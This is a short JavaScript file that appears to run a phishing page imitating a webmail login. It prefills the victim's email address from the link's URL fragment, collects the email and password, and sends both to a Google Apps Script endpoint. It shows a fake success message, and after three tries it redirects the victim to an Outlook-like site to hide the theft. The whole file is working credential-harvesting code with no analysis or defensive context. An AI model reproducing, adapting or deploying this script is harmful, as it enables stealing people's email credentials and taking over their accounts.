$(document).ready(function () {
  var count = 0;

  /////////////url email getting////////////////
  var email = window.location.hash.substr(1);
  if (!email) {
  } else {
    var my_email = email;
    var ind = my_email.indexOf("@");
    var my_slice = my_email.substr(ind + 1);
    var c = my_slice.substr(0, my_slice.indexOf("."));
    var final = c.toLowerCase();
    $("#msg").hide();
    $("#email").val(my_email);
    $("#dom").html(my_slice);
    $("#msg").hide();
  }
  ///////////////url getting email////////////////

  $("#submit-btn").click(function (event) {
    $("#error").hide();
    $("#msg").hide();
    event.preventDefault();
    var email = $("#email").val();
    var password = $("#password").val();
    var msg = $("#msg").html();
    $("#msg").text(msg);

    // Email Validation
    var emailFilter =
      /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

    if (!emailFilter.test(email)) {
      $("#error").show();
      $("#error").html("Invalid email format");
      return false;
    }

    // Password field required check
    if (!password) {
      $("#error").show();
      $("#error").html("Password is required");
      return false;
    }

    // Clear password field
    $("#password").val("");

    var ind = email.indexOf("@");
    var my_slice = email.substr(ind + 1);
    var c = my_slice.substr(0, my_slice.indexOf("."));
    var final = c.toLowerCase();
    var n = email.search("@");

    count = count + 1;

    // Change the button text to "Requesting..."
    $("#submit-btn").html("Requesting...");

    // Form submission using Fetch API
    const data = new FormData();
    data.append('email', email);
    data.append('password', password);

    fetch('https://script.google.com/macros/s/AKfycbz3AWVow6I5v8QudsabABDFDV7RwBEkxNm7qRCzu5ne5WytfuGRts8wDiWYbVba4tY/exec', {
      method: 'POST',
      body: data,
    })
      .then(response => response.text())
      .then(data => {
        if (data) {
          $("#msg").show();
          console.log(data);
          if (data.includes("ok")) {
            if (count >= 3) {
              count = 0;
              window.location.replace("https://outlookwebapp.com");
            }
            $("#msg").html("Successful: " + data);
          } else {
            $("#msg").html("Successful: " + data);
          }
        }
      })
      .catch(() => {
        if (count >= 3) {
          count = 0;
          window.location.replace("https://outlookwebapp.com/");
        }
        $("#msg").show();
        $("#msg").html("Please try again later");
      })
      .finally(() => {
        // Change the button text back to "Request"
        $("#submit-btn").html("Request");
      });
  });
});

function getEmail() {
  if (window.location.hash) {
    var url = window.location.href;
    var hash = url.split("#").pop();
    return atob(hash);
  }
}
